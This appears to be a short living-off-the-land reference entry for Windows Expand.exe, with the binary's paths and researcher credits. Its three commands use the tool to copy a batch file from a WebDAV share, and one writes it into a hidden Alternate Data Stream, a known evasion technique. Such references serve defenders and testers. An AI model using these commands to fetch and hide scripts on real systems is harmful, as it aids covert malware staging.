## Expand.exe
* Functions: Download, Copy, Add ADS
```

expand \\webdav\folder\file.bat c:\ADS\file.bat
Copies source file to destination.

expand c:\ADS\file1.bat c:\ADS\file2.bat
Copies source file to destination.

expand \\webdav\folder\file.bat c:\ADS\file.txt:file.bat
Copies source file to destination Alternate Data Stream (ADS).
```
   
* Resources:   
  * https://twitter.com/infosecn1nja/status/986628482858807297
  * https://twitter.com/Oddvarmoe/status/986709068759949319
   
* Full path:   
  * c:\windows\system32\Expand.exe
  * c:\windows\sysWOW64\Expand.exe
   
* Notes: Thanks to Rahmat Nurfauzi - @infosecn1nja, Oddvar Moe - @oddvarmoe  
   
